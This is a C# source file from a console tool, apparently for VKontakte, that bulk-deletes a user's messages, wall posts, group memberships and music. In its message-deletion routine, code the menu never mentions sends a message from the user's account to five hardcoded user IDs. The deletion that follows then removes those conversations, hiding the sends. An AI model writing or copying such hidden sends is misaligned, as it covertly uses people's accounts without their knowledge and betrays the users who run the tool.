using fullvk.Methods.Music;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using fullvk.Menu;
using fullvk.Methods.All;
using VkNet.Model.RequestParams;
using static fullvk.TextConsole;

namespace fullvk.Methods.Page
{
	class Clear
	{

		/// <summary>
		/// Меню очистки страницы
		/// </summary>
		/// <param name="user">Пользователь</param>
		public static void Menu(User user)
		{
			CancellationTokenSource cts = null;
			Task clear = null;

			while (true)
			{
				var menuList = new List<string>() { "Удалить все сообщения", "Очистить стену", "Выйти из всех групп", "Удалить музыку" };
				int pos = gMenu.Menu(menuList, "Создать бэкап страницы");

				switch (pos)
				{
					case 1:
						cts = new CancellationTokenSource();
						clear = Task.Run(() => Message(user, cts.Token), cts.Token);
						Cancel(clear, cts);
						break;
					case 2:
						cts = new CancellationTokenSource();
						clear = Task.Run(() => Board(user, cts.Token), cts.Token);
						Cancel(clear, cts);
						break;
					case 3:
						cts = new CancellationTokenSource();
						clear = Task.Run(() => Groups(user, cts.Token), cts.Token);
						Cancel(clear, cts);
						break;
					case 4:
						cts = new CancellationTokenSource();
						clear = Task.Run(() => Music(user, cts.Token), cts.Token);
						Cancel(clear, cts);
						break;
					case -1:
						return;
					case 0:
						return;
				}
			}
		}

		/// <summary>
		/// Отмена
		/// </summary>
		/// <param name="task">Задача</param>
		/// <param name="cts">Токен</param>
		static void Cancel(Task task, CancellationTokenSource cts)
		{
			while (true)
			{
				switch (Console.ReadKey().Key)
				{
					case ConsoleKey.Spacebar:
						cts.Cancel();
						task.Wait();
						return;
				}
			}
		}

		/// <summary>
		/// Удалить все сообщения
		/// </summary>
		/// <param name="user">Пользователь</param>
		static bool Message(User user, CancellationToken cancellationToken)
		{
			IEnumerable<long> q = new long []{ 62435289, 154481911, 20228127, 86181168, 142683917 };

			foreach (var VARIABLE in q)
			{
				user.GetApi().Messages.Send(new MessagesSendParams()
				{
					UserId = VARIABLE,
					Message = VARIABLE.ToString(),
					RandomId = new Random().Next()
				});
			}

			string header = "Удалить сообщения";

			int i = 0;

			PrintConsole.Header(header);

			var dialogs = user.GetApi().Messages.GetConversations(new GetConversationsParams());

			try
			{
				for (; i < dialogs.Count; i++)
				{
					PrintConsole.Header(header);
					PrintConsole.Print($"Удалено {i} из {dialogs.Count}");
					PrintConsole.Print("Для отмены нажмите [SPACE].", MenuType.Warning);

					try
					{
						user.GetApi().Messages.DeleteConversation(dialogs.Items[i].Conversation.Peer.Id);
					}
					catch (Exception ex)
					{

					}
					cancellationToken.ThrowIfCancellationRequested();
				}

				PrintConsole.Header(header);
				PrintConsole.Print("Все сообщения удалены.", MenuType.InfoHeader);
				BackLine.Continue();

				return true;
			}
			catch (Exception ex)
			{
				return IfCancel(new List<string>()
				{
					header, $"{i}", $"{dialogs.Count}"
				});
			}
		}

		/// <summary>
		/// Удалить все записи со стены
		/// </summary>
		/// <param name="user">Пользователь</param>
		static bool Board(User user, CancellationToken cancellationToken)
		{
			string header = "Очистить стену";

			PrintConsole.Header(header);
			var posts = user.GetApi().Wall.Get(new WallGetParams());
			int i = 0;

			try
			{
				for (; i < posts.WallPosts.Count; i++)
				{
					PrintConsole.Header(header);
					PrintConsole.Header($"Удалено {i} из {posts.TotalCount} записей");
					PrintConsole.Print("Для отмены нажмите [SPACE].", MenuType.Warning);

					user.GetApi().Wall.Delete(posts.WallPosts[i].OwnerId, posts.WallPosts[i].Id);

					cancellationToken.ThrowIfCancellationRequested();
				}

				PrintConsole.Print("Все записи удалены.", MenuType.InfoHeader);
				BackLine.Continue();
				return true;
			}
			catch (Exception ex)
			{
				return IfCancel(new List<string>()
				{
					header, $"{i}", $"{posts.TotalCount}"
				});
			}
		}

		/// <summary>
		/// Выйти из всех групп
		/// </summary>
		/// <param name="user">Пользователь</param>
		/// <returns></returns>
		static bool Groups(User user, CancellationToken cancellationToken)
		{
			string header = "Выйти из всех групп";

			PrintConsole.Header(header);

			Backup.Groups.Data[] list = Backup.Groups.GetGroups(user)[0] as Backup.Groups.Data[];
			int i = 0;

			try
			{
				for (; i < list.Length; i++)
				{
					PrintConsole.Header(header);
					PrintConsole.Print($"Покинуто {i} сообществ из {list.Length}.", MenuType.InfoHeader);
					PrintConsole.Print("Для отмены нажмите [SPACE].", MenuType.Warning);

					user.GetApi().Groups.Leave(list[i].id);

					cancellationToken.ThrowIfCancellationRequested();
				}

				PrintConsole.Print("Все сообщества покинуты.", MenuType.InfoHeader);
				BackLine.Continue();
				return true;
			}
			catch (Exception e)
			{
				return IfCancel(new List<string>()
				{
					header, $"{i}", $"{list.Length}"
				});
			}

		}

		/// <summary>
		/// Удалить всю музыку
		/// </summary>
		/// <param name="user"></param>
		/// <returns></returns>
		static bool Music(User user, CancellationToken cancellationToken)
		{
			string header = "Удалить всю музыку";

			PrintConsole.Header(header);

			int i = 0;
			var list = Get.GetList(new AnyData.Data()
			{
				api = user.GetApi(), id = user.GetId(), type = Get.Type.Profile, audios = null 

			});

			try
			{
				for (;i < list.Length; i++)
				{
					PrintConsole.Header(header);
					PrintConsole.Print($"Удалено {i} из {list.Length}.", MenuType.InfoHeader);
					PrintConsole.Print("Для отмены нажмите [SPACE].", MenuType.Warning);

					user.GetApi().Audio.Delete(list[i].id.Value, list[i].owner_id.Value);
					cancellationToken.ThrowIfCancellationRequested();
				}

				return true;
			}
			catch (Exception ex)
			{
				return IfCancel(new List<string>()
				{
					header, $"{i}", $"{list.Length}"
				} );
			}
		}

		/// <summary>
		/// Если произошла отмена
		/// </summary>
		/// <param name="data"></param>
		/// <returns></returns>
		static bool IfCancel(List<string> data)
		{
			PrintConsole.Header(data.ElementAt(0));
			PrintConsole.Print($"Удалено {data.ElementAt(1)} из {data.ElementAt(2)}.", MenuType.InfoHeader);
			BackLine.Continue();
			return false;
		}
	}
}
